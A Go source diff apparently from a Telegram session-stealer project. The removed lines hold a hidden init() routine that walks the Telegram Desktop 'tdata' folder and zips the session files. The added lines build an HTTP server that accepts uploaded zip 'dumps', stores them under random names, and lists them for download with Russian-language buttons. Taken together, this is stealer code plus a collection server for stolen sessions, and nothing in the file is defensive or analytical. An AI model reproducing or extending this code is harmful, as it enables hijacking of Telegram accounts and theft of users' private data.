@@ -1,62 +1,87 @@
-package util
+package main
 
 import (
-	"archive/zip"
-	"bytes"
+	"fmt"
+	"io"
+	"log"
+	"math/rand"
+	"net/http"
 	"os"
-	"path/filepath"
-	"strings"
+	"time"
 )
 
-var buf bytes.Buffer
-var zipWriter = zip.NewWriter(&buf)
+func generateRandomFileName() string {
+	rand.Seed(time.Now().UnixNano())
+	const letterBytes = "abcdefghijklmnopqrstuvwxyz"
+	b := make([]byte, 5)
+	for i := range b {
+		b[i] = letterBytes[rand.Intn(len(letterBytes))]
+	}
+	return string(b)
+}
 
-func init() {
-	dirname := filepath.Join(os.Getenv("APPDATA"), "Telegram Desktop", "tdata")
-
-	err := filepath.Walk(dirname, func(path string, info os.FileInfo, err error) error {
-		list := []string{"user_data", "webview", "emoji", "temp", "dumps", "working", "tdummy"}
-
-		if strings.HasSuffix(path, "tdata") {
-			return nil
-		}
-
-		for _, str := range list {
-			if strings.Contains(path, str) {
-				return nil
-			}
-		}
-
-		index := strings.Index(path, "tdata")
-		if index != -1 {
-			fileName := path[index:]
-			content, err := os.ReadFile(path)
-			if err != nil {
-				return nil
-			}
-			f, err := zipWriter.Create(fileName)
-			if err != nil {
-				return nil
-			}
-			_, err = f.Write(content)
-			if err != nil {
-				return nil
-			}
-		}
-		return nil
-	})
+func uploadFile(w http.ResponseWriter, r *http.Request) {
+	r.ParseMultipartForm(10 << 20) // Максимальный размер файла: 10MB
+	file, _, err := r.FormFile("file")
 	if err != nil {
+		fmt.Println("Error Retrieving the File")
+		fmt.Println(err)
+		return
+	}
+	defer file.Close()
+
+	// Генерируем случайное имя файла из 5 символов
+	randomFileName := generateRandomFileName()
+	filePath := fmt.Sprintf("./dump/%s.%v", randomFileName, "zip")
+
+	f, err := os.Create(filePath)
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	defer f.Close()
+	io.Copy(f, file)
+}
+
+func listFiles(w http.ResponseWriter, r *http.Request) {
+	files, err := os.ReadDir("./dump")
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
 		return
 	}
 
-	err = zipWriter.Close()
-	if err != nil {
-		return
-	}
+	fmt.Fprintf(w, "<div style='display: flex;align-items: center;justify-content: flex-start;flex-direction: row;flex-wrap: wrap;'>")
+	for _, file := range files {
+		fileName := file.Name()
+		filePath := fmt.Sprintf("/download/%s", fileName)
+		fileStat, _ := file.Info()
+		fileSizeBytes := fileStat.Size()
+		fileSizeMB := float64(fileSizeBytes) / (1024 * 1024)
+		fileModTime := fileStat.ModTime().Format("02.01.2006 15:04")
 
-	err = os.WriteFile("example.zip", buf.Bytes(), 0644)
-	if err != nil {
-		return
-	}
+		fmt.Fprintf(w, "<div style='display: flex;padding: 2px 12px;background: #ebebeb;font-size: 14pt;font-weight: 600;border-radius: 12px;flex-direction: column;flex-wrap: nowrap;align-items: center;margin: 6px;'>")
+		fmt.Fprintf(w, "<p>%s</p>", fileName)
+		fmt.Fprintf(w, "<p style='margin: 6px; font-size: 11pt; width: 100px; text-align: end;'>%.2f MB</p>", fileSizeMB)
+		fmt.Fprintf(w, "<p style='font-size: 10pt;font-weight: 500;color: #858585;margin: 2px 0;width: 100px;text-align: end;'>%s</p>", fileModTime)
+		fmt.Fprintf(w, "<a href=\"%s\" download=\"%s\"><button style='width: 100px; height: 36px; margin: 12px  0 0 0; border-radius: 12px; background: aquamarine; cursor: pointer;'>Скачать</button></a><br>", filePath, fileName)
+		fmt.Fprintf(w, "</div>")
 
+	}
+	fmt.Fprintf(w, "</div>")
+}
+
+func downloadFile(w http.ResponseWriter, r *http.Request) {
+	fileName := r.URL.Path[len("/download/"):]
+	filePath := fmt.Sprintf("./dump/%s", fileName)
+	http.ServeFile(w, r, filePath)
+}
+
+func main() {
+	http.HandleFunc("/upload", uploadFile)
+	http.HandleFunc("/dumps", listFiles)
+	http.HandleFunc("/download/", downloadFile)
+	err := http.ListenAndServe(":8080", nil)
+	if err != nil {
+		log.Fatal("ListenAndServe: ", err)
+	}
 }
